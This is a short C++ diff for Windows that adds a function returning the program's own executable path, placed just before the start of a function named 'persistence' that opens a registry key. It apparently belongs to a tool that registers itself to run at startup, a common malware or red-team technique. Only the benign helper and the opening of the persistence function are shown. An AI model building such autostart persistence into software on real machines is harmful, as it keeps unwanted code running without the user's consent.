@@ -21,6 +21,16 @@ bool fileExist(const std::filesystem::path& file_path) {
     return std::filesystem::exists(file_path, ec) && std::filesystem::is_regular_file(file_path, ec);
 }
 
+std::filesystem::path getExecutablePath() {
+    char buffer[MAX_PATH] = {0};
+    DWORD size = GetModuleFileNameA(nullptr, buffer, MAX_PATH);
+    if (size == 0) {
+        // Error, return empty path
+        return {};
+    }
+    return std::filesystem::path(buffer);
+}
+
 bool persistence(const std::wstring& valueName, const std::wstring& path) {
     // Function to apply persistence
     HKEY hKey;
